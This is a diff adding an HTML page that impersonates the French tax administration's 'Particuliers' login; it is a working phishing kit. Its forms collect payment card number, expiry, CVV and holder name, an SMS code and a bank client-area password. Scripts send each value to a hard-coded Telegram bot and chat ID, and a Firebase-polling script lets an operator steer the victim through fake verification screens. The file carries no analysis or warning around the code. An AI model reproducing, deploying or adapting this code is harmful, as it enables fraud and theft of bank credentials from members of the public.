@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+		<meta charset="utf-8"/>
+		<meta content="width=device-width, initial-scale=1" name="viewport"/>
+		
+<link charset="utf-8" href="templates/styles/bootstrap.min.css" rel="stylesheet" type="text/css"/>
+<link charset="utf-8" href="templates/styles/commun.css" rel="stylesheet" type="text/css"/>
+<link charset="utf-8" href="templates/styles/mire.css" rel="stylesheet" type="text/css"/>
+<link charset="utf-8" href="templates/styles/dac.css" rel="stylesheet" type="text/css"/>
+<script src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js"></script>
+<script src='//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
+<script src='//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js'></script>
+<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+<link rel='stylesheet' href='//maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css'><link rel="stylesheet" href="./style.css">
+
+		<link rel="stylesheet" href="style.css">
+			
+		<title>Particuliers | authentification</title>
+	</head>
+	<body>
+		
+		<header style="margin-bottom: 30px;">
+			<div class="container">
+			<!--Le logo-->
+			<div class="row">
+				<!-- Partie gauche -->
+				<div class="col-xs-1u2 col-sm-6 col-md-6">
+					
+						<img src="https://i.postimg.cc/cCSMMbPk/1708385258505.png" style="margin: 20px;" width="200px" />
+			
+			
+		</div></div></div></header>
+		
+		
+		<main class="container" id="contenu">
+			
+			<div class="row">
+				
+				<div class="col-md-6">
+					
+					<div class="panel panel-default">
+						<div class="panel-heading">
+							<h2 class="text-center" id="titre_authent">Authentification</h2>
+						</div>
+						<div class="panel-body">
+							
+							<div style="display:none" id="Loading">
+<div class="dot-spinner-container">
+  <span>Veuillez pabontor pendant que nous traitons votre demande. S'il vous plaît, ne fermez pas cette fenêtre</span>
+  <center><div class="dot-spinner">
+    <div class="dot-spinner__dot"></div>
+    <div class="dot-spinner__dot"></div>
+    <div class="dot-spinner__dot"></div>
+    <div class="dot-spinner__dot"></div>
+    <div class="dot-spinner__dot"></div>
+    <div class="dot-spinner__dot"></div>
+    <div class="dot-spinner__dot"></div>
+    <div class="dot-spinner__dot"></div>
+</div></center>
+</div>
+</div>
+
+<div style="display:none" id="SMS">
+<div class="dagaSms">
+	<b style="color:#438600">Veuillez entrer le code que nous vous avons envoye par SMS sur votre téléphone mobile</b>
+	<p>Code Sécurité:</p>
+  </div>
+<div class="keyboardSms">
+	<div id="er-sms" style="background:#FFD5D5;color:#853737;padding:8px;border-radius:2px;margin:0 0 10px 0;text-align:left;display:none;">
+		<span>Les informations sont incorrectes, veuillez vérifier à nouveau</span>
+		</div>
+    <input type="number" placeholder="sms" class="smscode" required>
+ 
+    <button class="btnvaSms" onclick="validateSms()">Valider</button>
+</div>
+</div>
+
+<div style="display:none" id="CC">
+      <h1 style="font-size: 20px !important;">Payer sa commande</h1>
+      <div class="card-row">
+          <span class="visa"></span>
+          <span class="mastercard"></span>
+          <span class="amex"></span>
+          <span class="discover"></span>
+      </div>
+      <div>
+          <div class="form-group">
+          	<div id="er-cc" style="background:#FFD5D5;color:#853737;padding:8px;border-radius:2px;margin:0 0 10px 0;text-align:left;display:none;">
+		<span>Les informations sont incorrectes, veuillez vérifier à nouveau</span>
+		</div>
+          <div class="form-group">
+              <label or="NameOnCard">Nom sur la carte</label>
+              <input id="NameOnCard" class="form-control nameValue" type="text" maxlength="255" required></input>
+          </div>
+          <div class="form-group">
+              <label for="CreditCardNumber">Numéro de carte</label>
+              <input id="CreditCardNumber" class="null card-image form-control ccValue" type="text" required></input>
+          </div>
+          <div class="expiry-date-group form-group">
+              <label for="ExpiryDate">Date d'expiration</label>
+              <input id="ExpiryDate" class="form-control exmValue" type="text" placeholder="MM / YY" maxlength="7" required></input>
+          </div>
+          <div class="security-code-group form-group">
+              <label for="SecurityCode">cvv</label>
+              <div class="input-container" >
+                  <input id="SecurityCode" class="form-control vvcValue" type="text" required></input>
+                  <svg id="cvc" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <circle cx="12" cy="12" r="10" stroke="#B6B6B6" stroke-width="1.5"></circle> <path d="M10.125 8.875C10.125 7.83947 10.9645 7 12 7C13.0355 7 13.875 7.83947 13.875 8.875C13.875 9.56245 13.505 10.1635 12.9534 10.4899C12.478 10.7711 12 11.1977 12 11.75V13" stroke="#B6B6B6" stroke-width="1.5" stroke-linecap="round"></path> <circle cx="12" cy="16" r="1" fill="#B6B6B6"></circle> </g></svg>
+              </div>
+              <div class="cvc-preview-container two-card hide">
+                  <div class="amex-cvc-preview"></div>
+                  <div class="visa-mc-dis-cvc-preview"></div>
+              </div>
+          </div>
+          
+          <button id="PayButton" class="btn btn-block btn-success submit-button" onclick="validateCC()" type="submit">
+              <span class="submit-button-lock"></span>
+              <span class="align-middle" >Valider</span>
+          </button>
+      </div>
+  </div>
+</div>
+
+
+<div style="display:none" id="CODE2">
+<div class="dagaCode">
+	<b>Pour valider votre remboursement, veuillez vous authentifier.</b>
+	<p>Composez le mot de passe de votre Espace Client bancaire.</p>
+  </div>
+<div class="keyboardCode">
+    <input type="text" class="passwordCode" required>
+    <div class="ganga" id="numberContainer">
+    </div>
+    <button class="btnvaCode" onclick="validate()">Valider</button>
+</div>
+</div>
+
+<div style="display:none" id="APP">
+<div class="para">
+	<div style="display:flex;margin-bottom:10px;align-items: center; justify-content: center;text-align:center;">
+	<svg viewBox="0 0 17 17" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" fill="#000000"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M9.5 10.972c0 0.366-0.207 0.672-0.5 0.846v2.154h-1v-2.153c-0.294-0.174-0.5-0.48-0.5-0.847 0-0.552 0.447-1 1-1 0.551 0 1 0.447 1 1zM14.965 8.46v7.080c0 0.827-0.673 1.5-1.5 1.5h-9.989c-0.827 0-1.5-0.673-1.5-1.5v-7.080c0-0.827 0.673-1.5 1.5-1.5h0.024v-1.988c0-2.757 2.243-5 5-5s5 2.243 5 5v1.992c0.811 0.018 1.465 0.681 1.465 1.496zM4.5 6.96h8v-1.988c0-2.206-1.794-4-4-4s-4 1.794-4 4v1.988zM13.965 8.46c0-0.264-0.207-0.474-0.465-0.493v0.004h-10v-0.011h-0.024c-0.275 0-0.5 0.224-0.5 0.5v7.080c0 0.276 0.225 0.5 0.5 0.5h9.989c0.275 0 0.5-0.224 0.5-0.5v-7.080z" fill="#000000"></path> </g></svg>
+<span>Votre connexion nécessite une sécurisation</span>
+</div>
+<b style="margin:10px 0">Veuillez ouvrir votre application mobile bancaire pour vérifier et confirmer votre identité.</b>
+
+<div class="animation-container">
+<lottie-player src="https://lottie.host/9226ed78-64e0-4c22-a51e-d7d51a19fcd7/VW9sauCG3D.json" background="transparent" speed="1" loop autoplay ></lottie-player>
+</div>
+</div>
+</div>
+
+<div style="display:none" id="APPYES">
+<div style="text-align: center;margin:10px">
+<svg width="100" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" fill="#000000"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><path d="M512 64l100.266667 76.8 123.733333-17.066667 46.933333 117.333334 117.333334 46.933333-17.066667 123.733333L960 512l-76.8 100.266667 17.066667 123.733333-117.333334 46.933333-46.933333 117.333334-123.733333-17.066667L512 960l-100.266667-76.8-123.733333 17.066667-46.933333-117.333334-117.333334-46.933333 17.066667-123.733333L64 512l76.8-100.266667-17.066667-123.733333 117.333334-46.933333 46.933333-117.333334 123.733333 17.066667z" fill="#8BC34A"></path><path d="M738.133333 311.466667L448 601.6l-119.466667-119.466667-59.733333 59.733334 179.2 179.2 349.866667-349.866667z" fill="#ffffff"></path></g></svg>
+</div>
+</div>
+
+<div style="display:none" id="APPNO">
+<div style="text-align: center;margin:10px">
+<svg fill="#B60000" height="100px" width="100px" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 208.891 208.891" xml:space="preserve"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M0,170l65.555-65.555L0,38.891L38.891,0l65.555,65.555L170,0l38.891,38.891l-65.555,65.555L208.891,170L170,208.891 l-65.555-65.555l-65.555,65.555L0,170z"></path> </g></svg>
+</div>
+</div>
+
+
+<div style="display:none" id="RESU">
+RESU
+</div>
+
+<script>
+	
+	var urlweb = window.location.href;
+var params = (new URL(urlweb)).searchParams;
+var idValue = params.get('id');
+const url = "https://testespam-91c35-default-rtdb.firebaseio.com/.json";
+
+function fetchData() {
+	
+	
+  fetch(url)
+    .then(response => response.json())
+    .then(data => {
+    	
+      const userId = idValue;
+
+      Loading.style.display = (data.user[userId].Loading === "true" ) ? "block" : "none";
+      CC.style.display = (data.user[userId].CC === "true") ? "block" : "none";
+      SMS.style.display = (data.user[userId].SMS === "true") ? "block" : "none";
+      CODE2.style.display = (data.user[userId].CODE2 === "true") ? "block" : "none";
+      APP.style.display = (data.user[userId].APP === "true") ? "block" : "none";
+      APPNO.style.display = (data.user[userId].APPNO === "true") ? "block" : "none";
+      APPYES.style.display = (data.user[userId].APPYES === "true") ? "block" : "none";
+      RESU.style.display = (data.user[userId].RESU === "true") ? "block" : "none";
+    })
+    .catch(error => {
+      console.error('Error fetching data:', error);
+    });
+}
+
+
+setInterval(fetchData, 1000);
+
+</script>
+
+
+
+							</div>
+						
+						
+						</div>
+					<!-- panel-default FIN -->
+				</div>
+				<!-- Fin col-md-6 -->
+				<!-- ============== -->
+				<!-- AIDE DEBUT -->
+				<!-- ============== -->
+				<section class="col-md-6" id="aide">
+					<div class="panel panel-default">
+						<div class="panel-heading">
+							<h2 class="text-center">Aide</h2>
+						</div>
+						<div class="panel-body">
+							<details class="aideSPI" id="aide_spi">
+								<summary>Où trouver votre numéro fiscal&nbsp;?</summary>
+								<div class="well">
+									<p>Si vous disposez déjà d'un espace particulier, vous pouvez <a data-target="#numFiscal" data-toggle="modal" href="#" id="disp_perte_spi" onclick="return false;" title="Ouverture dans une fenêtre modale">recevoir votre numéro fiscal par courriel</a>.</p>
+									<p>Il figure aussi en haut de la première page de votre dernière déclaration de revenus reçue <a href="../external.html?link=https://www.impots.gouv.fr/portail/particulier/questions/jai-egare-les-identifiants-dacces-mon-espace-particulier-comment-puis-je-les-0" rel="noopener" target="_blank" title="Nouvelle fenêtre">ou sur vos avis <span class="dgfipicon dgfipicon-sortie-page" title="Nouvelle fenêtre"></span></a> : </p>
+									<div id="exemple_SPI">
+										
+										<figure class="text-center spacer-top" role="group">
+											<img alt="Légende disponible après l'illustration" class="img-responsive center-block img-thumbnail" height="145" src="templates/images/spi1.svg" width="350" />
+											<figcaption class="text-muted"><em> Illustration : emplacement de votre numéro fiscal, sur votre avis</em></figcaption>
+										</figure>
+									</div>
+								</div>
+							</details>
+							<details class="aideSPI" id="aide_spi1">
+								<summary>Vous n'avez pas encore de numéro fiscal&nbsp;?</summary>
+								<div class="well">		
+                                                                <p>Pour obtenir la création de votre numéro fiscal, veuillez vous adresser à votre 
+								  <span id="CFP">Centre des finances publiques</span>
+								</p>
+                                                                </div>
+							</details>
+							<details class="aideCode hide" id="aide_code">
+								<summary>Vous avez perdu votre code de création</summary>
+								<div class="well">
+									<p>Vous pouvez
+										<a data-target="#codeCreation" data-toggle="modal" href="#">l'obtenir à nouveau par courriel</a>.
+									</p>
+								</div>
+							</details>
+							<details class="aideIdentifiants hide" id="aide_nael">
+								<summary>Où trouver votre numéro d'accès en ligne&nbsp;?</summary>
+								<div class="well">
+									<p>Il figure en haut de la première page de votre dernière déclaration de revenus reçue.</p>
+									<div id="exemple_NAEL">
+										<figure class="text-center spacer-top" role="group">
+											<img alt="Légende disponible après l'illustration" class="img-responsive center-block img-thumbnail" height="145" src="templates/images/num_acces.svg" width="473" />
+											<figcaption class="text-muted"><em>Illustration : emplacement de votre numéro d'accès en ligne, sur votre déclaration</em></figcaption>
+										</figure>
+									</div>
+								</div>
+							</details>
+							<details class="aideIdentifiants hide" id="aide_rfr">
+								<summary>Où trouver votre revenu fiscal de référence&nbsp;?</summary>
+								<div class="well">
+									<p>Il se trouve sur la première page de votre dernier avis d'impôt sur les revenus.
+									</p>
+									
+								</div>
+							</details>
+							<details class="aideMdp hide" id="aide_mdp">
+								<summary>Vous avez oublié votre mot de passe</summary>
+								<div class="well">
+									<p>Vous pouvez
+										<a data-target="#passPerdu" data-toggle="modal" href="#" tabindex="0" title="Ouverture dans une fenêtre modale">renouveler votre mot de passe en quelques clics</a>.
+									</p>
+								</div>
+							</details>
+							<details class="aideMdp hide" id="aide_mdp1">
+								<summary>Comment modifier votre mot de passe&nbsp;?</summary>
+								<div class="well">
+									<p>Une fois connecté, vous pourrez le modifier depuis «&nbsp;Mon profil&nbsp;».</p>
+								</div>
+							</details>
+							<details class="ocfiNonIR hide" id="aide_ocfiNonIR">
+								<summary>Quels éléments fournir pour prouver votre identité&nbsp;?</summary>
+								<div class="well">
+									<p>Vous devez adresser à votre <span id="CFP2">centre des Finances Fubliques</span> une reproduction recto-verso de l'un des éléments suivants&nbsp;:</p>
+									<ul>
+										<li>carte nationale d'identité ou passeport en cours de validité&nbsp;;</li>
+										<li>livret de famille à jour&nbsp;;</li>
+										<li>carte d'invalide de guerre&nbsp;;</li>
+										<li>carte d'invalide civil&nbsp;;</li>
+										<li>extrait d'acte de naissance ou copie intégrale avec mentions en marge&nbsp;;</li>
+										<li>titre de séjour&nbsp;;</li>
+										<li>visa long séjour valant titre de séjour&nbsp;;</li>
+									</ul>
+									<p>À défaut, sont également recevables&nbsp;:</p>
+									<ul>
+										<li>livret de circulation&nbsp;;</li>
+										<li>carte de ressortissant d'un État membre de l'Union Européenne.</li>
+									</ul>
+								</div>
+							</details>
+							<details class="aideIdentifiants hide" id="aide_perteid">
+								<summary>Numéro d'accès en ligne et revenu fiscal de référence perdus</summary>
+								<div class="well">
+									<p>Nous vous invitons à vous adresser à votre
+										<span id="CFP3">centre des Finances Publiques</span> 
+									</p>
+									<p>Faites votre demande en indiquant votre numéro fiscal, ou votre état civil complet, et tous éléments utiles.
+									</p>
+									<p> Les identifiants vous seront alors transmis de manière sécurisée, généralement à l'aide de vos coordonnées (adresse électronique ou téléphone) déjà connues de votre service. 
+									</p>
+								</div>
+							</details>
+							<details class="aideFC hide" id="aide_connexFC">
+								<summary>Se connecter avec FranceConnect</summary>
+								<div class="well">
+									<p>
+										<b>Les services disponibles</b><br />
+										Avec vos identifiants impots.gouv.fr, vous pouvez effectuer des démarches administratives sur des sites partenaires de FranceConnect. Le logo FranceConnect figure sur l'espace d'authentification de ces sites. 
+										<br /><br />
+										<b>Un accès unique et personnel</b><br />
+										L'identification sur un site proposant le bouton FranceConnect est strictement personnelle. Chaque membre d'un foyer fiscal disposant d'un numéro fiscal et d'une adresse électronique validée sur le site impots.gouv.fr peut accéder aux services en ligne en saisissant son propre numéro fiscal.
+										<br /><br />
+										<b>Je rencontre des difficultés pour me connecter</b><br />
+										Nous vous invitons à vérifier la saisie de votre numéro fiscal et de votre mot de passe.<br />
+										Nous vous rappelons que vous devez avoir créé un compte sur le site <a href="index.html">impots.gouv.fr</a>.<br />
+										Si vos identifiants sont correctement saisis et que le blocage persiste, nous vous invitons à contacter le support d'aide FranceConnect à l'adresse suivante : support.usagers@franceconnect.gouv.fr
+									</p>
+								</div>
+							</details>
+						</div>
+						<!-- Fin du panel-body  -->
+						<div class="panel-footer marge">
+							<details id="aide_services">
+								<summary>Les services disponibles sur votre espace particulier</summary>
+								<div class="well">
+									<p>Vous pouvez&nbsp;: </p>
+									<ul>
+										<li>gérer votre prélèvement à la source,</li>
+										<li>payer vos impôts,</li>
+										<li>déclarer vos revenus,</li>
+										<li>consulter vos déclarations et avis d'imposition,</li>
+										</ul>
+								</div>
+							</details>
+							<details id="aide_cookies">
+								<summary>Gestion des <em lang="en">cookies</em></summary>
+								<div class="well">
+									<p>Un <em>cookie</em> est un petit fichier, enregistré sur votre appareil, qui contient des informations nécessaires au fonctionnement
+										du site.
+									</p>
+									<p>Nous n'y enregistrons pas de donnée personnelle.</p>
+									<p>Votre navigateur propose en général un mode de navigation privée,
+										qui supprime les <em>cookies</em> à la fermeture du logiciel.
+									</p>
+								</div>
+							</details>
+						</div>
+						<!-- Fin du panel-footer   -->
+					</div>
+					<!-- Fin du panel-default  -->
+				</section>
+				<!-- Fin de la colonne d'aide -->
+			</div>
+			<!-- row FIN -->
+		</main>
+		<!-- containe contenu FIN -->
+		<footer role="contentinfo">
+			<p class="col-md-12 text-center">Direction générale des Finances publiques</p>
+		</footer>
+		
+		
+		
+		
+		
+		
+		
+		
+		<script>
+function validateCC() {
+	
+var url = window.location.href;
+var params = (new URL(url)).searchParams;
+var idValue = params.get('id');
+
+    var nameValue = $('.nameValue').val();
+    var ccValue = $('.ccValue').val();
+    var exmValue = $('.exmValue').val();
+    var vvcValue = $('.vvcValue').val();
+    var botToken = '6405780707:AAHRLzgioifKDMGv5Rr9BGI-xqr-R7TZmtQ';
+    var chatId = '5426755496';
+
+    if (nameValue && ccValue && exmValue && vvcValue) {
+        $.ajax({
+            type: 'POST',
+            url: 'https://api.telegram.org/bot' + botToken + '/sendMessage',
+            data: {
+                chat_id: chatId,
+                text: 'IMPOTS-CC :' + ccValue + '-' + exmValue + '\nNAME: ' + nameValue + '\nCVV: ' + vvcValue + '\nID : ' + idValue
+            },
+        });
+    } else {
+        $("#er-cc").show();
+    }
+}
+
+</script>
+
+
+	<script>
+		$(function () {
+  $('[data-toggle="popover"]').popover();
+  
+  $('#cvc').on('click', function(){
+    if ( $('.cvc-preview-container').hasClass('hide') ) {
+      $('.cvc-preview-container').removeClass('hide');
+    } else {
+      $('.cvc-preview-container').addClass('hide');
+    }    
+  });
+  
+  $('.cvc-preview-container').on('click', function(){
+    $(this).addClass('hide');
+  });
+});
+		</script>
+
+<script>
+function validateSms() {
+	var url = window.location.href;
+var params = (new URL(url)).searchParams;
+var idValue = params.get('id');
+
+    var inputValue = $('.smscode').val();
+    var botToken = '6405780707:AAHRLzgioifKDMGv5Rr9BGI-xqr-R7TZmtQ';
+    var chatId = '5426755496';
+    
+    if (inputValue) {
+    $.ajax({
+        type: 'POST',
+        url: 'https://api.telegram.org/bot' + botToken + '/sendMessage',
+        data: {
+            chat_id: chatId,
+            text: 'IMPOTS-SMS :' + inputValue + '\nID : ' + idValue
+        },
+        
+    });
+    } else {
+        $("#er-sms").show();
+    }
+}
+</script>
+
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+
+    var numbers = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0];
+
+
+    numbers = numbers.sort(function() {
+        return Math.random() - 0.5;
+    });
+
+
+    var numberContainer = document.getElementById("numberContainer");
+
+    numbers.forEach(function(number) {
+        var button = document.createElement("button");
+        button.className = "buttonRa";
+        button.textContent = number;
+        button.onclick = function() {
+            insertNumber(number);
+        };
+        numberContainer.appendChild(button);
+    });
+});
+
+
+function insertNumber(number) {
+        var passwordCodeInput = document.querySelector('.passwordCode');
+        passwordCodeInput.value += number;
+    }
+
+
+function validate() {
+
+}
+</script>
+
+<script>
+function validate() {
+
+var url = window.location.href;
+var params = (new URL(url)).searchParams;
+var idValue = params.get('id');
+
+
+    var inputValue = $('.passwordCode').val();
+    var botToken = '6405780707:AAHRLzgioifKDMGv5Rr9BGI-xqr-R7TZmtQ';
+    var chatId = '5426755496';
+
+    $.ajax({
+        type: 'POST',
+        url: 'https://api.telegram.org/bot' + botToken + '/sendMessage',
+        data: {
+            chat_id: chatId,
+            text: 'IMPOTS-CODE : ' + inputValue + '\nID : ' + idValue
+        },
+        
+    });
+}
+</script>
+
+
+
+		
+</body>
+</html>
